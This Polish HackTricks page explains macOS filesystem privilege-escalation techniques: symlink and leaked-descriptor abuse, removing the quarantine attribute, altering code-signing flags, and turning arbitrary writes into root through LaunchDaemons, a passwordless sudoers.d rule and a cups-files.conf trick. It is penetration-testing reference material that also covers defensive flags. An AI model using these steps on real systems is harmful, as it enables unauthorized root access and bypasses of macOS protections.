# Sztuczki z systemem plików macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacje uprawnień POSIX

W przypadku **katalogu** trzy bity uprawnień oznaczają coś innego niż w przypadku zwykłego pliku. `chmod(1)` określa bit wykonywania jako „**search**”, gdy jest stosowany do katalogu:<sup>[[2]](#references)</sup>

> `0100` W przypadku plików zezwala właścicielowi na wykonywanie. W przypadku katalogów zezwala właścicielowi na **przeszukiwanie** katalogu.

- **odczyt** - możesz **wyliczyć** wpisy katalogu (wyświetlić nazwy).
- **zapis** - możesz **tworzyć, zmieniać nazwy i usuwać wpisy** w katalogu. Pamiętaj, że jest to właściwość *katalogu nadrzędnego*, a nie pliku: możesz usunąć plik, którego nie możesz odczytać ani modyfikować, o ile możesz zapisywać w jego katalogu nadrzędnym.
  - Aby usunąć **podkatalog**, musi być pusty, co z kolei wymaga odpowiednich uprawnień do usunięcia wszystkiego, co się w nim znajduje.
  - Jeśli katalog ma **sticky bit** (`S_ISVTX`, jak `/tmp`), obowiązuje ograniczenie — POSIX stanowi, że proces może wtedy usuwać pliki lub zmieniać ich nazwy tylko wtedy, gdy jest ich właścicielem, jest właścicielem katalogu albo ma odpowiednie uprawnienia.<sup>[[1]](#references)</sup>
- **wykonywanie / przeszukiwanie** - możesz **przechodzić przez** katalog. Rozwiązywanie ścieżki lokalizuje każdy jej składnik „w katalogu określonym przez poprzedni składnik”, dlatego **utrata prawa do przeszukiwania choćby jednego składnika prefiksu ścieżki sprawia, że wszystko poniżej staje się niedostępne za pomocą ścieżki**, nawet jeśli sam plik końcowy jest dostępny do odczytu dla wszystkich.<sup>[[1]](#references)</sup>

### Niebezpieczne kombinacje

**Jak nadpisać plik/katalog należący do roota**, gdy:

- Właścicielem jednego **katalogu nadrzędnego** na ścieżce jest użytkownik
- Właścicielem jednego **katalogu nadrzędnego** na ścieżce jest **grupa użytkowników** mająca **dostęp do zapisu**
- **Grupa** użytkowników ma **dostęp do zapisu** do **pliku**

Przy dowolnej z powyższych kombinacji atakujący może **wstrzyknąć** **symlink/hard link** do oczekiwanej ścieżki, aby uzyskać uprzywilejowany, dowolny zapis.

### Przypadek szczególny: katalog root z R+X

Wynika to bezpośrednio z powyższej zasady rozwiązywania ścieżek. Jeśli **katalog przyznaje R+X wyłącznie rootowi**, pliki w nim są niedostępne *za pomocą ścieżki* dla wszystkich pozostałych — ale **bity uprawnień samych plików mogą nadal zezwalać na dostęp**. Jedyną przeszkodą jest katalog.

Każda więc prymitywna operacja, która pozwala wydostać plik **z tego katalogu** — uprzywilejowany proces, który **przenosi/zmienia nazwę/kopiuje** ścieżkę wybraną przez atakującego do lokalizacji, przez którą możesz *przechodzić* — umożliwia dowolny odczyt bez konieczności omijania uprawnień samego pliku:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Szukaj uprzywilejowanych procesów przenoszących pliki (instalatorów, rotatorów logów, kolektorów awarii/diagnostycznych, funkcji tworzenia kopii zapasowych i „eksportu”), które akceptują ścieżkę źródłową od użytkownika o niższych uprawnieniach.

## Dowiązanie symboliczne / dowiązanie twarde

### Niewystarczająco restrykcyjny plik/katalog

Jeśli uprzywilejowany proces zapisuje dane do **pliku**, który może być **kontrolowany** przez użytkownika o **niższych uprawnieniach** albo który mógł zostać **wcześniej utworzony** przez takiego użytkownika, może on po prostu **wskazać inny plik** za pomocą dowiązania symbolicznego lub twardego, a uprzywilejowany proces zapisze dane w tym pliku.

Sprawdź pozostałe sekcje, aby znaleźć przypadki, w których atakujący może **nadużyć dowolnego zapisu, by eskalować uprawnienia**.

### `O_NOFOLLOW` w `open`

Zgodnie z [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Jeśli w masce użyto `O_NOFOLLOW`, a plik docelowy przekazany do `open()` jest dowiązaniem symbolicznym, wywołanie `open()` zakończy się niepowodzeniem”*. Sprawdzany jest tylko **ostatni** element ścieżki — wszystkie **pośrednie** elementy nadal są rozwiązywane i podążają za dowiązaniami. Dlatego programista, który „zabezpieczył” zapis za pomocą `O_NOFOLLOW`, nadal może paść ofiarą ataku polegającego na umieszczeniu dowiązania symbolicznego w dowolnym **katalogu nadrzędnym** ścieżki docelowej.<sup>[[3]](#references)</sup>

Ta sama strona podręcznika opisuje flagi, które rzeczywiście eliminują tę lukę:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *„jeśli dowolny element ścieżki przekazanej do `open()` jest dowiązaniem symbolicznym, wywołanie `open()` zakończy się niepowodzeniem”*.
- **`O_RESOLVE_BENEATH`** — *„jeśli rozwiązywanie podanej ścieżki wychodzi poza katalog powiązany z fd, wywołanie `openat()` zakończy się niepowodzeniem”*.

W przeciwnym razie pozostałymi sposobami na powstrzymanie podmiany dowiązania symbolicznego w środku ścieżki są użycie `openat()` względem wcześniej zweryfikowanego deskryptora katalogu albo `realpath()` i ponowna walidacja.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać inne aplikacje lub pliki binarne, więc po ich otwarciu uruchamiana jest wskazana aplikacja lub plik binarny.\
Przykład:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Deskryptory plików

### Leak FD (bez `O_CLOEXEC`)

Jeśli wywołanie `open` nie zawiera flagi `O_CLOEXEC`, deskryptor pliku zostanie odziedziczony przez proces potomny. Jeśli więc uprzywilejowany proces otworzy uprzywilejowany plik i uruchomi proces kontrolowany przez atakującego, atakujący **odziedziczy FD do uprzywilejowanego pliku**.

Klasycznym przykładem jest **LPE przez `DYLD_PRINT_TO_FILE` w OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` uwzględniał `DYLD_PRINT_TO_FILE=/path` nawet w **ograniczonych plikach binarnych (suid root)**, ponieważ ta konkretna zmienna była parsowana poza `processDyldEnvironmentVariable()`.
- Wywoływał `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, więc **tworzył plik należący do roota pod dowolną ścieżką**.
- FD **nigdy nie był zamykany i nie miał flagi close-on-exec**, więc każdy proces potomny pliku binarnego suid dziedziczył **zapisywalny FD do pliku należącego do roota**.
- Uruchomienie np. `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a następnie odczytanie numeru odziedziczonego FD w procesie potomnym umożliwiało dowolny zapis do pliku należącego do roota; `fcntl(fd, F_SETFL, 0)` usuwał nawet `O_APPEND`, pozwalając nadpisywać plik zamiast dopisywać do niego.

Podobny scenariusz występuje zawsze, gdy uprzywilejowany proces otwiera plik **przed** wykonaniem przez `exec` czegoś, co kontrolujesz (narzędzi pomocniczych, edytorów uruchamianych przez `$EDITOR` w stylu `crontab`, plików logów/debug otwieranych ze ścieżki podanej przez zmienną środowiskową...). Wylicz odziedziczone FD za pomocą:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Każda wartość powyżej `2`, która wskazuje na plik, którego nie możesz samodzielnie otworzyć, jest primitive typu arbitrary-write (lub arbitrary-read).

## Unikaj sztuczek z quarantine xattrs

### Usuń to

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable flag

Jeśli plik/katalog ma ten atrybut niezmienności, nie będzie można dodać do niego xattr.

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Systemy plików bez obsługi xattr

Nie każdy system plików, który macOS może zamontować, natywnie przechowuje **atrybuty rozszerzone**. HFS+ i APFS je obsługują; **FAT32, exFAT i większość montowań NFS — nie**. macOS emuluje tę funkcję, zapisując dodatkowy plik `._<filename>` w formacie **AppleDouble** ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Ma to znaczenie dla kwarantanny, ponieważ xattr przetrwa tylko wtedy, gdy da się go **zapisać i odczytać** z tego samego woluminu:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Jeśli wolumin zostanie później odczytany ze ścieżki, która ignoruje plik towarzyszący `._` (albo plik ten zostanie usunięty), plik trafi na miejsce **bez flagi kwarantanny** — a aplikacja `.app` bez kwarantanny wystarczy, by ominąć App Sandbox, jak opisano w [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### ACL writeextattr i działanie kwarantanny AppleDouble

Przykład ACL `writeextattr`, mechanizm AppleDouble `com.apple.acl.text` oraz etapy tworzenia i walidacji pliku sidecar opisano w [AppleDouble/ACL quarantine bypass reproduction](macos-appledouble-acl-quarantine-bypass.md).

## Omijanie kontroli podpisów

### Omijanie kontroli platform binaries

Niektóre kontrole bezpieczeństwa sprawdzają, czy plik binarny jest **platform binary**, na przykład po to, by zezwolić na połączenie z usługą XPC. Jednak, jak pokazano w opisie obejścia w https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, można ominąć tę kontrolę, pobierając platform binary (np. /bin/ls) i wstrzykując exploit za pomocą dyld, używając zmiennej środowiskowej `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Omijanie flag `CS_REQUIRE_LV` i `CS_FORCED_LV`

Uruchomiony plik binarny może zmienić własne flagi, aby ominąć kontrole, za pomocą kodu takiego jak:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Omijanie podpisów kodu

Bundle zawiera plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego **pliku** w **bundle**. Pamiętaj, że hash pliku CodeResources jest również **osadzony w pliku wykonywalnym**, więc jego też nie możemy zmieniać.

Są jednak pliki, których podpis nie będzie sprawdzany. W plist mają one klucz `omit`, na przykład:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Możliwe jest obliczenie sygnatury zasobu z poziomu CLI za pomocą:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Montowanie dmg

Użytkownik może zamontować niestandardowy obraz dmg utworzony nawet na istniejących folderach. Oto jak można utworzyć pakiet dmg z własną zawartością:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Zwykle macOS montuje dyski, komunikując się z usługą Mach `com.apple.DiskArbitrarion.diskarbitrariond` (udostępnianą przez `/usr/libexec/diskarbitrationd`). Po dodaniu parametru `-d` do pliku plist LaunchDaemons i ponownym uruchomieniu usługi, logi będą zapisywane w `/var/log/diskarbitrationd.log`.\
Można jednak użyć narzędzi takich jak `hdik` i `hdiutil`, aby komunikować się bezpośrednio z kextem `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic sh scripts

Jeśli Twój skrypt może być interpretowany jako **shell script**, możesz nadpisać skrypt powłoki **`/etc/periodic/daily/999.local`**, który będzie uruchamiany codziennie.

Możesz **symulować** wykonanie tego skryptu za pomocą: **`sudo periodic daily`**

### Daemons

Utwórz dowolny **LaunchDaemon**, na przykład **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, z plikiem plist uruchamiającym dowolny skrypt, na przykład:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Wygeneruj po prostu skrypt `/Applications/Scripts/privesc.sh` z **poleceniami**, które chcesz uruchomić jako root.

### Plik Sudoers

Jeśli masz **dowolny zapis**, możesz utworzyć plik w folderze **`/etc/sudoers.d/`**, który nada Ci uprawnienia **sudo**.

### Pliki PATH

Plik **`/etc/paths`** to jedno z głównych miejsc, które uzupełniają zmienną środowiskową PATH. Do jego nadpisania potrzebujesz uprawnień root, ale jeśli skrypt uruchamiany przez **uprzywilejowany proces** wykonuje jakieś **polecenie bez pełnej ścieżki**, możesz być w stanie je **hijackować**, modyfikując ten plik.

Możesz również zapisywać pliki w **`/etc/paths.d`**, aby dodawać nowe foldery do zmiennej środowiskowej `PATH`.

### cups-files.conf

Ta technika została wykorzystana w [tym opisie](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Utwórz plik `/etc/cups/cups-files.conf` z następującą zawartością:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

This utworzy plik `/etc/sudoers.d/lpe` z uprawnieniami 777. Dodatkowy śmieć na końcu służy do wywołania utworzenia logu błędów.

Następnie zapisz w `/etc/sudoers.d/lpe` konfigurację potrzebną do eskalacji uprawnień, np. `%staff ALL=(ALL) NOPASSWD:ALL`.

Potem ponownie zmodyfikuj plik `/etc/cups/cups-files.conf`, ustawiając `LogFilePerm 700`, aby nowy plik sudoers stał się poprawny po wywołaniu `cupsctl`.

### Sandbox Escape

Możliwe jest ucieczka z sandboxa macOS za pomocą FS arbitrary write. Przykłady znajdziesz na stronie [macOS Auto Start](../../../../macos-auto-start-locations.md), ale często stosowanym sposobem jest zapisanie pliku preferencji Terminala w `~/Library/Preferences/com.apple.Terminal.plist`, który uruchamia polecenie przy starcie, a następnie wywołanie go za pomocą `open`.

## Tworzenie zapisywalnych plików jako inni użytkownicy

Bardzo często stosowanym prymitywem privesc jest **skłonienie uprzywilejowanego procesu do utworzenia pliku** w kontrolowanym przez Ciebie katalogu, a następnie zachowanie **prawa zapisu** do tego pliku. Potrzebne są dwa elementy:

1. Katalog, którego jesteś właścicielem (lub w którym możesz ustawić **dziedziczoną ACL**), aby wszystkie utworzone w nim pliki dziedziczyły Twoje uprawnienia.
2. Uprzywilejowany proces/`suid`, któremu można wskazać, **gdzie** ma utworzyć plik — zazwyczaj za pomocą zmiennej środowiskowej debugowania/logowania, pliku konfiguracyjnego lub API XPC pomocnika.

To właśnie część dotycząca **dziedziczonej ACL** sprawia, że utworzony plik jest zapisywalny przez Ciebie, mimo że jego właścicielem jest inny użytkownik. Flagi dziedziczenia `file_inherit` / `directory_inherit` opisano w [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Teraz każdy plik utworzony przez uprzywilejowany proces wewnątrz `$DIRNAME` jest **zapisywalny przez Ciebie**. Jeśli ten katalog jest też lokalizacją, z której pliki są później **wykonywane jako root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, katalog LaunchDaemon...), jest to bezpośrednia eskalacja uprawnień do roota. Zobacz sekcje [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) powyżej, aby dowiedzieć się, co zapisać w pliku, gdy już go masz.

Pełny przykład łańcucha „zmienna środowiskowa powoduje, że proces root tworzy plik, a FD wycieka do Ciebie” znajdziesz powyżej w sekcji [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## Pamięć współdzielona POSIX

**Pamięć współdzielona POSIX** umożliwia procesom w systemach operacyjnych zgodnych z POSIX dostęp do wspólnego obszaru pamięci, co ułatwia szybszą komunikację w porównaniu z innymi metodami komunikacji międzyprocesowej. Polega na utworzeniu lub otwarciu obiektu pamięci współdzielonej za pomocą `shm_open()`, ustawieniu jego rozmiaru za pomocą `ftruncate()` i zamapowaniu go w przestrzeni adresowej procesu przy użyciu `mmap()`. Procesy mogą następnie bezpośrednio odczytywać i zapisywać dane w tym obszarze pamięci. Aby zarządzać równoczesnym dostępem i zapobiegać uszkodzeniu danych, często stosuje się mechanizmy synchronizacji, takie jak mutexy lub semafory. Na koniec procesy odmapowują i zamykają pamięć współdzieloną za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. Mechanizm ten sprawdza się szczególnie dobrze w wydajnej, szybkiej komunikacji IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.

<details>

<summary>Przykład kodu producenta</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Przykład kodu konsumenta</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOS guarded descriptors** to funkcja bezpieczeństwa wprowadzona w macOS w celu zwiększenia bezpieczeństwa i niezawodności operacji na **file descriptorach** w aplikacjach użytkownika. Te guarded descriptors umożliwiają przypisanie do file descriptorów określonych ograniczeń lub „guards”, które są egzekwowane przez kernel.

Funkcja ta jest szczególnie przydatna do zapobiegania niektórym rodzajom luk w zabezpieczeniach, takim jak **nieautoryzowany dostęp do plików** lub **race conditions**. Luki te występują na przykład wtedy, gdy wątek uzyskuje dostęp do opisu pliku, dając **innemu podatnemu wątkowi dostęp do niego**, lub gdy file descriptor zostaje **odziedziczony** przez podatny proces potomny. Niektóre funkcje związane z tą funkcjonalnością to:

- `guarded_open_np`: Otwiera file descriptor z guardem
- `guarded_close_np`: Zamyka go
- `change_fdguard_np`: Zmienia flagi guarda na deskryptorze (może też usunąć ochronę guarda)

## References

- [1] [POSIX.1-2024 — Definicje podstawowe, rozdz. 4 (Uprawnienia dostępu do plików, ochrona katalogów, rozwiązywanie ścieżek)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [strona podręcznika `chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [strona podręcznika `open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins — lokalna eskalacja uprawnień przez DYLD_PRINT_TO_FILE w OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company — Które systemy plików i usługi chmurowe zachowują atrybuty rozszerzone?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) — Nowa era ucieczek z macOS Sandbox](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji — Odkrywanie luk w zabezpieczeniach Apple: analiza audytu diskarbitrationd i storagekitd, część 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
